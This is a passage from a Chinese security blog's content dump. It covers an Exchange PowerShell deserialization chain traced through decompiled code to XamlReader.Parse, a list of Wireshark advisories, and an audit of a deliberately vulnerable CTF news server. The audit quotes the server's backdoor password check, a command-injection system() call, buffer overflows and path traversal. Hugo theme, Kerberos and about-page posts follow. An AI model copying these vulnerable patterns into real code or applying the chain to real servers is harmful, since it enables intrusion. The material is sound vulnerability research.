psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } 而后调用PSMemberInfoIntegratingCollection构造函数，其中PSMemberInfoIntegratingCollection类继承了PSMemberInfo类。传入构造函数的collections变量来源于PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable) 函数的返回值，构造函数将collections赋给当前对象的collections属性。\ninternal class PSMemberInfoIntegratingCollection\u0026lt;T\u0026gt; : PSMemberInfoCollection\u0026lt;T\u0026gt;, IEnumerable\u0026lt;T\u0026gt;, IEnumerable where T : PSMemberInfo { // Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4 private void GenerateAllReservedMembers() { if (!this.mshOwner.hasGeneratedReservedMembers) { this.mshOwner.hasGeneratedReservedMembers = true; ReservedNameMembers.GeneratePSExtendedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSBaseMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSObjectMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSAdaptedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSTypeNames(this.mshOwner); } } internal PSMemberInfoIntegratingCollection(object owner, Collection\u0026lt;CollectionEntry\u0026lt;T\u0026gt;\u0026gt; collections) { if (owner == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;owner\u0026#34;); } this.mshOwner = (owner as PSObject); this.memberSetOwner = (owner as PSMemberSet); if (this.mshOwner == null \u0026amp;\u0026amp; this.memberSetOwner == null) { throw PSTraceSource.NewArgumentException(\u0026#34;owner\u0026#34;); } if (collections == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;collections\u0026#34;); } this.collections = collections; } GetMemberCollection代码如下，其会将对象的adaptedMembers属性添加到列表中，而在内层对象反序列化时已经将名为TargetTypeForDeserialization的XamlReader类型的Type对象加入到adaptedMembers属性中。所以返回的列表内也会包含该对象。\ninternal static Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable) { Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; collection = new Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt;(); if ((viewType \u0026amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended) { if (backupTypeTable == null) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), true, true, \u0026#34;type table members\u0026#34;)); } else { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;((PSObject msjObj) =\u0026gt; PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable), (PSObject msjObj, string name) =\u0026gt; PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable, name), true, true, \u0026#34;type table members\u0026#34;)); } } if ((viewType \u0026amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted) { **collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;adapted members\u0026#34;));** } if ((viewType \u0026amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;clr members\u0026#34;)); } return collection; } private static T AdapterGetMemberDelegate\u0026lt;T\u0026gt;(PSObject msjObj, string name) where T : PSMemberInfo { if (!msjObj.isDeserialized) { T t = msjObj.InternalAdapter.BaseGetMember\u0026lt;T\u0026gt;(msjObj.immediateBaseObject, name); PSObject.memberResolution.WriteLine(\u0026#34;Adapted member: {0}.\u0026#34;, (t == null) ? \u0026#34;not found\u0026#34; : t.Name); return t; } if (msjObj.adaptedMembers == null) { return default(T); } T t2 = msjObj.adaptedMembers[name] as T; PSObject.memberResolution.WriteLine(\u0026#34;Serialized adapted member: {0}.\u0026#34;, (t2 == null) ? \u0026#34;not found\u0026#34; : t2.Name); return t2; } 返回到GetPSStandardMember函数中，Exchange会匹配构造函数返回的对象的memberName属性，该属性来源于GetTargetTypeForDeserialization调用时传递的硬编码TargetTypeForDeserialization，即将从该对象中检索名为TargetTypeForDeserialization的值，前面提到过列表内已有该名字的对象，所以将匹配到XamlReader类型的Type对象，并返回给上层函数。\n返回到上层函数，GetTargetTypeForDeserialization返回了XamlReader类型。\n进入到ConvertTo函数内，valueToConvert为上层函数ReadOneObject函数传入的obj对象，其内包含了xaml反序列化的命令执行字符串。\n进入到LanguagePrimitives.FigureConversion在#3527处断点，此时fromType为String，toType为XamlReader\n进入FigureParseConversion内，将会通过反射获取到XamlReader的Parse方法。\nprivate static LanguagePrimitives.PSConverter\u0026lt;object\u0026gt; FigureParseConversion(Type fromType, Type toType) { ..... else if (fromType == typeof(string)) { MethodInfo methodInfo = null; try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string), typeof(IFormatProvider) }, null); } catch (AmbiguousMatchException ex) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex.Message); } catch (ArgumentException ex2) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex2.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithCulture); } try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string) }, null); } catch (AmbiguousMatchException ex3) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex3.Message); } catch (ArgumentException ex4) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex4.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithoutCulture); } } return null; } XamlReader.Parse方法将会由LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCulture方法调用。之后就是普通的反序列化过程了。\n小结 这个漏洞利用链核心是如何绕过Exchange黑名单类并使Exchange将攻击者控制的指定数据反序列化到指定危险类造成代码执行。\n漏洞利用了Exchange的合法功能，先构造了名为targetTypeForDeserialization 的XamlReader类型的Type对象序列化值，利用Microsoft.Exchange.Data.SerializationTypeConverter的特性返回了XamlReader类型的Type对象，而后ReadProperties将其加入到adaptedMember内。在外层对象反序列化时，构造的PSMembers包含了名为targetTypeForDeserialization的XamlReader类型的Type对象，Exchange会在PSMembers列表内匹配targetTypeForDeserialization项，从而控制了ConvertTo函数转化的目标类XamlReader，Exchange通过反射获取到了XamlReader的Parse方法，调用该方法反序列化攻击者可控的序列化数据，触发代码执行。\n在调试过程中需要将.NET Framework的优化关掉以便dnSpy调试\n[.NET Framework Debugging Control] GenerateTrackingInfo=1 AllowOptimize=0 COMPlus_ZapDisable=1 COMPlus_ReadyToRun=0 其他\nPSRP：PowerShell Remote Protocol powerShell远程协议，是微软提供的通过SOAP协议上执行PowerShell代码的协议\n参考资料\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\nhttps://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\nCreated at 2023-05-05T20:35:49+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5代码审计","tags":[],"description":"","content":"通过爬取wireshark的漏洞公告页面，筛选1.8.6修复的漏洞可以得到如下结果：\n1.8.6/1.8.7修复的漏洞\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Server审计","tags":[],"description":"","content":"代码地址\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\n编译：gcc -m32 -g -o news_server news_server.c\n目标：找出10个bug和漏洞\nnews_server默认工作在根目录，没有通过chdir切换工作目录（不知道算不算bug）\n修复：\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); 在authenticate函数存在admin后门\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate 中直接拼接用户输入到命令，命令注入\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); 栈溢出、任意文件读（目录穿越）\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) 文件写（目录穿越）、栈溢出11字节\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"给hugo-theme-learn增加timeline功能","tags":[],"description":"","content":"前言 现在使用hugo-theme-learn主题，但这个主题没有提供时间线功能，为了给首页增加时间线功能，花了两天研究了一下怎么添加时间线功能。\n为了方便增加时间线的事件，采用自定义shortcode的方式增加时间线，代码大部分参考引用链接里面的，魔改了一下以适应自己的主题，增加了过去多少天的显示。\n代码实现 在layout/shortcodes新增文件：event.html和timeline.html，内容分别如下\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // 如果月份大于1则 if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; 由于event.html里面引用了dayjs，这个js不在当前主题内，可以在config.toml新增custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]，然后把dayjs.min.js放在theme\\hugo-theme-learn\\static\\js目录内，即可解决导入dayjs的问题。\n此时可以在需要添加时间线的地方使用timeline的shortcode添加，以下是我博客首页的时间线代码：\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03至09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} 这两天，给hugo主题增加了timeline的shortcode，见[增加timeline功能](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29至09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} 周内审计了代码 {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} 除了这个还顺便给博客新增了基于Github issue的评论功能，参考\rutteranc。\n参考\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"关于我","tags":[],"description":"","content":"关于我 21年毕业，目前在某安全厂商工作，主要研究二进制，做一些应急响应方面的东西，业余也会看看web侧的一些简单漏洞，这个博客记录了我分析的一些漏洞和一些安全研究的文章。\n从小时候在电视上看到黑客在网络上上天入地无所不能，如今已入安全行业，希望能够长久保持对网络安全的好奇心，不会被消磨自己的好奇心，能够给世界留下一点属于自己的东西。\nGitHub地址 Chestnuts4\n希望可以跟教主说的那样坚持下去\n希望可以持之以恒做安全研究。\n黑客精神：Open, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"认证原理","tags":[],"description":"","content":"认证原理 一、Kerberos概念 Kerberos是计算机网络授权协议，用于在非安全网络中，对个人通信过程中用安全的手段进行身份认证。其中客户端和服务端能够相互认证，识别对方身份。Kerberos是第三方认证，依赖于第三方服务器对彼此进行身份验证，Kerberos服务器本身成为KDC。 由三部分组成：\nKerberos知道用户和集群内服务以及各自的密码数据库 AS验证用户身份，验证通过就会返回给Client端一个TGT Client通过TGT向TGS获取ST 服务验证ST有效性，如果有效则Client可以访问服务 二、Kerberos名词解释 AS（Authentication Server）认证服务器 KDC（Key Distribution Center）密钥分发中心 TGT（Ticket Granting Ticket）票据授权票据，给票据授权的票据 TGS（Ticket Granting Service）票据授权服务 SS（Service Server）服务提供服务器 ST（Server Ticket）服务端票据 一般KDC同时包含AS和TGS\n三、Kerberos验证过程 Client登录，用户输入用户名和密码，会用单向函数根据密码生成客户端密钥（Client Secret Key）\nClient向AS发送A消息请求TGT\nA消息内容 用户名 请求服务名称，这里是TGS 网络地址 请求TGT的生命周期 该消息不会加密，也不会发送密码或者密码生成的密钥 AS检查用户名是否存在AS用户名数据库内，并使用数据库中用户密码生成的NTLM哈希解密客户端消息\n如果数据库内有该用户名则随机生成TGS会话密钥（TGS Session Key），同时给Client端发送两条消息\nB消息内容用客户端密钥加密 TGS名称 时间戳 生命周期 TGS会话密钥（TGS Session Key） C消息内容（TGT）用TGS密钥（TGS Secret Key）加密 用户名 TGS名称 时间戳 用户网络地址 生命周期 TGS会话密钥（TGS Session Key） Client用通过密码生成的客户端密钥解密B消息，如果密码正确则可以得到TGS会话密钥（TGS Session Key），将C消息（TGT）存储在本地凭据缓存内。\nClient向TGS请求ST，期间需要向TGS发送两条消息明文\nD消息内容 想要请求的服务ID即SS 生命周期 TGT E消息内容使用TGS会话密钥（TGS Session Key）加密即身份验证器 用户名 时间戳 TGS验证Client请求服务是否存在，存在则进入下一步。\nTGS提取D消息内的TGT，用TGS密钥解密（TGS Secret Key），从中提取TGS会话密钥（TGS Session Key），再用TGS会话密钥解密E得到用户名和时间戳，现在TGS得到了用户名和消息E的时间戳，以及消息C的用户名和时间戳\n比较两个用户名和时间戳 检查TGT生命周期是否过期 检查身份验证器（E消息）是否在缓存内(存疑) TGS生成随机服务会话（service session key）密钥，并发送两条消息给Client\nF消息内容用服务密钥(Service Secret Key)加密 用户名 服务名 时间戳 网络地址 生命周期 服务会话密钥 G消息内容用TGS会话密钥加密 服务名 时间戳 生命周期 服务会话密钥 因为Client有TGS会话密钥所以可以解密消息G得到服务会话密钥（service session key）\n客户端和SS连接，发送两条消息\n消息H用服务会话密钥加密内容身份验证器： 用户名 时间戳 消息L 即消息F SS收到请求，用服务密钥解密消息I即消息F得到服务会话密钥及用户名时间戳等信息，再用服务会话密钥解密消息H得到用户名和时间戳\nSS进行身份验证\n比较消息H内用户名和消息F内的用户名 比较消息H和消息F内的是时间戳 检查消息F内生命周期 检查身份验证器是否在缓存内 SS向Client验证身份，向其发送消息\n消息J使用服务会话密钥加密身份验证器 服务ID 时间戳（在消息H内的时间戳） 客户端收到SS的身份验证器消息（J），使用缓存内的服务会话密钥进行解密得到服务ID及时间戳，并验证是否有效\n参考链接\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\n简化模型 Client向AS发送明文消息，申请访问的服务 AS检查用户名是否存在本地数据库中，存在则返回两条消息 A：Client/TGS会话密钥(Client/TGS Session 